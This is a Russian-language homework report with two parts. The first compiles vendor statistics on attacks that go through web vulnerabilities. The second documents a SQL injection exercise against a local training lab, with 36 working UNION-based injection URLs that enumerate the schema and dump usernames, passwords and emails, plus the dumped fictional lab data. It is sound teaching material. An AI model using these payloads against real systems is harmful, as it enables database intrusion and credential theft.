# Отчет по домашнему заданию: веб-уязвимости и SQL-инъекция

Дата выполнения: 30.04.2026

## Часть I. Статистика по атакам через веб-уязвимости

### Использованные источники

1. Positive Technologies, "Итоги проектов по расследованию инцидентов и ретроспективному анализу - 2024-2025"  
   https://www.ptsecurity.com/research/analytics/results-of-incident-investigation-and-retrospective-analysis-projects-2024-2025/
2. Positive Technologies / K2 Cloud через Anti-Malware.ru, "Как меняется защита веб-приложений", 15.08.2024  
   https://www.anti-malware.ru/analytics/Technology_Analysis/How-Web-Application-Security-Is-Changing
3. Forescout Vedere Labs, "2024 Threat Roundup", 27.01.2025  
   https://www.forescout.com/press-releases/forescout-announces-2024-threat-roundup-report/
4. Akamai, "Web Attacks Targeting Applications and APIs Up by 49% in the Last Year", 30.07.2024  
   https://www.akamai.com/newsroom/press-release/web-attacks-targeting-applications-and-apis-up-by-49-in-the-last-year
5. Cloudflare, "State of Application Security 2024", пресс-релиз, 25.06.2024  
   https://www.cloudflare.com/en-ca/press-releases/2024/new-cloudflare-report-shows-organizations-struggle-with-outdated-security/
6. Kaspersky, "Access control and data exposure flaws prevalent in corporate web applications", 12.03.2024  
   https://usa.kaspersky.com/about/press-releases/access-control-and-data-exposure-flaws-prevalent-in-corporate-web-applications-kaspersky-study-finds
7. Radware, "2024 Global Threat Analysis Report"  
   https://www.radware.com/getattachment/88a6c3e7-e8c5-4a7f-a53d-6fba9cdffe03/Radware_ThreatReport_Report_2024_RW-459.pdf.aspx
8. AIONCLOUD, "2024.10 Web Attack Trend Report", 22.11.2024  
   https://www.aioncloud.com/2024-10-web-attack-trend-report/
9. Verizon, "2024 Data Breach Investigations Report"  
   https://www.verizon.com/business/resources/reports/dbir.html

### Доля атак через веб-уязвимости и веб-приложения

Данные отличаются, потому что источники считают разные события: успешные инциденты, все зафиксированные попытки атак, WAF-срабатывания или результаты пентестов.

| Источник | Scope исследования | Что показывает |
|---|---:|---|
| Positive Technologies, IR 2024-2025 | 100+ проектов расследования и ретроспективного анализа за период IV кв. 2024 - III кв. 2025 | В 36% случаев исходной точкой проникновения были бизнес-приложения на сетевом периметре. Это близко к требуемой метрике, потому что речь идет о расследованных реальных инцидентах. |
| Positive Technologies / Anti-Malware, 2024 | Российский рынок, обобщение наблюдений Positive Technologies за три года | За последние три года в 63% случаев веб-приложения были исходным вектором атаки. |
| Verizon DBIR 2024 | 30 458 инцидентов и 10 626 подтвержденных утечек | Паттерн Basic Web Application Attacks составил чуть более 8% подтвержденных breaches; внутри него чаще использовались украденные учетные данные, но эксплуатация уязвимостей также присутствовала как часть сценария. |
| Forescout 2024 Threat Roundup | 900 млн атак в телеметрии Forescout | Веб-приложения были самым атакуемым типом сервиса: 41% атак в 2024 году против 26% в 2022-2023. Эксплойты против веб-приложений выросли с 36% в 2023 до 56% в 2024. |
| Akamai SOTI 2024 | Глобальная телеметрия Akamai Connected Cloud | В июне 2024 зафиксировано более 26 млрд атак на приложения и API; за год рост составил 49%. Среди частых векторов указаны LFI, XSS, SQLi, command injection, SSRF. |
| Cloudflare State of Application Security 2024 | Трафик Cloudflare с 01.04.2023 по 31.03.2024 | Cloudflare mitigated 6.8% всего web application/API traffic; DDoS составил 37.1% mitigated application traffic, bad bots - 31.2% всего трафика. Это не только эксплуатация уязвимостей, но показывает нагрузку на веб-слой. |

Вывод: для успешных расследованных атак наиболее применим показатель Positive Technologies 2024-2025: 36% проникновений начались через бизнес-приложения на периметре. Если брать более широкий российский scope за несколько лет, встречается оценка 63% случаев, где веб-приложения были исходным вектором. По глобальной телеметрии попыток атак доля веб-приложений также очень высокая: Forescout фиксирует 41% атак именно на web applications как наиболее атакуемый тип сервиса.

### Распределение по конкретным уязвимостям

Kaspersky исследовала корпоративные веб-приложения, разработанные компаниями для себя, в 2021-2023 годах. Это не статистика успешных атак, а доля приложений, где нашли конкретные классы уязвимостей:

| Класс уязвимости | Доля приложений, где найдено | Доля high-risk внутри класса |
|---|---:|---:|
| Broken Access Control | 70% | 37% |
| Sensitive Data Exposure | 70% | 9% |
| Cross-Site Scripting (XSS) | 61% | 11% |
| Server-Side Request Forgery (SSRF) | 57% | 15% |
| Broken Authentication | 52% | 21% |
| SQL Injection | 43% | 88% |
| Security Misconfiguration | 43% | 15% |
| Insufficient Protection from Brute Force Attacks | 39% | 11% |
| Weak User Password | 22% | 78% |
| Using Components with Known Vulnerabilities | 13% | 43% |

Radware приводит распределение web application security violations в WAF-телеметрии за 2023 год:

| Тип нарушения / атаки | Доля |
|---|---:|
| Predictable Resource Location | 29.5% |
| Code Injection | 19.3% |
| SQL Injection | 12.9% |
| Server Information Leakage | 7.74% |
| Session Flow Violation | 7.47% |
| Security Misconfiguration | 6.48% |
| Cross-Site Scripting | 5.69% |
| Server Misconfiguration | 2.81% |
| Folder Access Violation | 2.32% |
| Path Traversal | 2.30% |
| Unauthorized Access Attempt | 2.25% |
| URL Access Violation | 1.08% |
| Application Information Leakage | 0.202% |

AIONCLOUD за октябрь 2024 года по логам AIWAF дает похожий срез именно попыток веб-атак:

| Тип атаки | Доля |
|---|---:|
| SQL Injection | 37.54% |
| App Weak | 19.78% |
| Default Page | 18.10% |
| Directory Traversal | 9.91% |

Короткий вывод по распределению: SQL-инъекции остаются заметным и высокорисковым классом. У Kaspersky 43% проверенных корпоративных приложений содержали SQLi, причем 88% найденных SQLi были high-risk. В WAF-телеметрии SQLi занимает 12.9% у Radware и 37.54% у AIONCLOUD за октябрь 2024, но эти цифры нельзя напрямую сравнивать: у них разные выборки и правила классификации.

## Часть II. Практика SQL-инъекции

### Подготовка

Docker и Docker Compose уже установлены:

```text
Docker version 28.1.1, build 4eba377
Docker Compose version v2.35.1-desktop.1
```

В рабочую папку добавлен `docker-compose.yml` с сервисами:

```yaml
services:
  web:
    image: ket9/otus-devsecops:latest
    platform: linux/amd64
    depends_on:
      - db
    ports:
      - "8080:80"

  db:
    image: mysql:5.7
    platform: linux/amd64
    ports:
      - "8989:3306"
    environment:
      MYSQL_ROOT_PASSWORD: "Vdjo7#l-er"
```

На машине уже был поднят такой же контейнерный стенд: `ket9/otus-devsecops:latest` на `localhost:8080` и MySQL на `localhost:8989`. База была инициализирована штатной ссылкой:

```text
http://localhost:8080/sql-connections/setup-db.php
```

### Ход рассуждений

1. Открыл главную страницу и страницу задания. Приложение просит передать `id` как GET-параметр: `/task?id=...`.
2. Запрос `id=1` вернул пользователя `admin`, значит параметр попадает в SQL-запрос.
3. Запрос с одинарной кавычкой `id=1'` вернул ошибку SQL-синтаксиса. Из этого следует, что значение параметра, вероятно, подставляется в строку SQL внутри кавычек. Поэтому полезная нагрузка должна закрывать кавычку и комментировать хвост запроса символом `#`.
4. Через `ORDER BY` было установлено число колонок: `ORDER BY 1`, `ORDER BY 2`, `ORDER BY 3` работают, а `ORDER BY 4` дает ошибку `Unknown column '4' in 'order clause'`. Значит в исходном SELECT три колонки.
5. Через `UNION SELECT 1,2,3` проверено, какие колонки выводятся на страницу. На экране видны первая и вторая колонки: `Ваш id` и `Ваш логин`.
6. Через `database(), user(), version()` определено имя базы: `security`.
7. Через `information_schema.tables` найдены таблицы: `emails`, `users`.
8. Через `information_schema.columns` найдены колонки:
   - `users`: `id`, `username`, `password`
   - `emails`: `id`, `email_id`
9. Через `group_concat` выгружены данные из `users` и `emails`.

### Ответы на задания

1. Пароль пользователя `Volk2`: `Wa spoiuuuuu`
2. Почта пользователя `Vinni-pukh`: `honey_lover@otus-lab.com`

### Все отправленные URL

| N | URL | Результат / зачем отправлялся |
|---:|---|---|
| 1 | `http://localhost:8080/` | Главная страница стенда. |
| 2 | `http://localhost:8080/task` | Страница задания, без `id` данных не выводит. |
| 3 | `http://localhost:8080/task?id=1` | Проверка параметра: вернул `admin`. |
| 4 | `http://localhost:8080/sql-connections/setup-db.php` | Установка/сброс базы, успешное обновление БД. |
| 5 | `http://localhost:8080/task?id=1%27` | Неудачная проба с кавычкой; вернула SQL syntax error. |
| 6 | `http://localhost:8080/task?id=1%20OR%201=1` | Неудачная проба без закрытия кавычки; вывела обычный `admin`. |
| 7 | `http://localhost:8080/task?id=1%20ORDER%20BY%201` | Неудачная/неинформативная проба без закрытия кавычки; вывела `admin`. |
| 8 | `http://localhost:8080/task?id=1%20ORDER%20BY%202` | Неудачная/неинформативная проба без закрытия кавычки; вывела `admin`. |
| 9 | `http://localhost:8080/task?id=1%20ORDER%20BY%203` | Неудачная/неинформативная проба без закрытия кавычки; вывела `admin`. |
| 10 | `http://localhost:8080/task?id=1%20ORDER%20BY%204` | Неудачная/неинформативная проба без закрытия кавычки; вывела `admin`. |
| 11 | `http://localhost:8080/task?id=1%20ORDER%20BY%205` | Неудачная/неинформативная проба без закрытия кавычки; вывела `admin`. |
| 12 | `http://localhost:8080/task?id=-1%20UNION%20SELECT%201,2,3` | Неудачная проба `UNION` без закрытия кавычки; данных не дала. |
| 13 | `http://localhost:8080/task?id=-1%20UNION%20SELECT%201,2` | Неудачная проба `UNION` с неверной структурой; данных не дала. |
| 14 | `http://localhost:8080/task?id=1%27%20OR%20%271%27=%271%27%23` | Успешная проверка инъекции с закрытием кавычки и комментарием; вернул `admin`. |
| 15 | `http://localhost:8080/task?id=1%27%20ORDER%20BY%201%23` | Проверка числа колонок: работает. |
| 16 | `http://localhost:8080/task?id=1%27%20ORDER%20BY%202%23` | Проверка числа колонок: работает. |
| 17 | `http://localhost:8080/task?id=1%27%20ORDER%20BY%203%23` | Проверка числа колонок: работает. |
| 18 | `http://localhost:8080/task?id=1%27%20ORDER%20BY%204%23` | Проверка числа колонок: ошибка `Unknown column '4'`; значит колонок 3. |
| 19 | `http://localhost:8080/task?id=1%27%20ORDER%20BY%205%23` | Дополнительная проверка: ошибка `Unknown column '5'`. |
| 20 | `http://localhost:8080/task?id=1%27%20ORDER%20BY%206%23` | Дополнительная проверка: ошибка `Unknown column '6'`. |
| 21 | `http://localhost:8080/task?id=1%27%20ORDER%20BY%207%23` | Дополнительная проверка: ошибка `Unknown column '7'`. |
| 22 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,2,3%23` | Проверка `UNION` на 3 колонки: вывел `Ваш id:1`, `Ваш логин:2`. |
| 23 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20database(),user(),version()%23` | Определены БД и пользователь: `security`, `root@...`; версия ушла в невидимую 3-ю колонку. |
| 24 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20null,null,null%23` | Проверка `null` в колонках; вывел пустые значения. |
| 25 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20group_concat(table_name),2,3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%23` | Найдены таблицы: `emails,users`. |
| 26 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%23` | Те же таблицы выведены во 2-й видимой колонке: `emails,users`. |
| 27 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name=%27users%27%23` | Колонки таблицы `users`: `id,username,password`. |
| 28 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name=%27emails%27%23` | Колонки таблицы `emails`: `id,email_id`. |
| 29 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20group_concat(column_name),2,3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name=%27users%27%23` | Повторная проверка колонок `users` в 1-й видимой колонке. |
| 30 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20group_concat(column_name),2,3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name=%27emails%27%23` | Повторная проверка колонок `emails` в 1-й видимой колонке. |
| 31 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(id,0x3a,username,0x3a,password%20separator%200x7c),3%20FROM%20users%23` | Выгрузка `users`; содержит пароль `Volk2:Wa spoiuuuuu`. |
| 32 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20group_concat(id,0x3a,username,0x3a,password%20separator%200x7c),2,3%20FROM%20users%23` | Повторная выгрузка `users` в 1-й видимой колонке. |
| 33 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(id,0x3a,email_id%20separator%200x7c),3%20FROM%20emails%23` | Выгрузка `emails`; для id `4` почта `honey_lover@otus-lab.com`. |
| 34 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20group_concat(id,0x3a,email_id%20separator%200x7c),2,3%20FROM%20emails%23` | Повторная выгрузка `emails` в 1-й видимой колонке. |
| 35 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,password,3%20FROM%20users%20WHERE%20username=%27Volk2%27%23` | Точечный запрос по заданию 1; вернул пароль `Wa spoiuuuuu`. |
| 36 | `http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,email_id,3%20FROM%20emails%20WHERE%20id=(SELECT%20id%20FROM%20users%20WHERE%20username=%27Vinni-pukh%27)%23` | Точечный запрос по заданию 2; вернул почту `honey_lover@otus-lab.com`. |

### Фрагменты полученных данных

Из таблицы `users`:

```text
1:admin:kjhsd8@j0dfjk3$%jksli
2:Volk:nu zayzc, nu pogodi!
3:Matroskin:a ya vse chawe zame4aiu, 4to menya kak budto kto-to podmenil
4:Vinni-pukh:Ya tu4ka-tu4ka-tu4ka
5:Neznaika:na Lune
6:kotenok:Gav
7:Karlson:muwchina v samom rascvete sil
8:Kesha:pust vsegda budet Vovka
9:Volk2:Wa spoiuuuuu
```

Из таблицы `emails`:

```text
1:admin@otus-lab.com
2:volchara1969@otus-lab.com
3:matroskin_is_prostokvashino@otus-lab.com
4:honey_lover@otus-lab.com
5:ne.znaika@otus-lab.com
6:kotenok@otus-lab.com
7:karlson@otus-lab.com
9:volk@otus-lab.com
```

Так как `Vinni-pukh` имеет `id=4` в таблице `users`, его почта берется из `emails.id=4`: `honey_lover@otus-lab.com`.
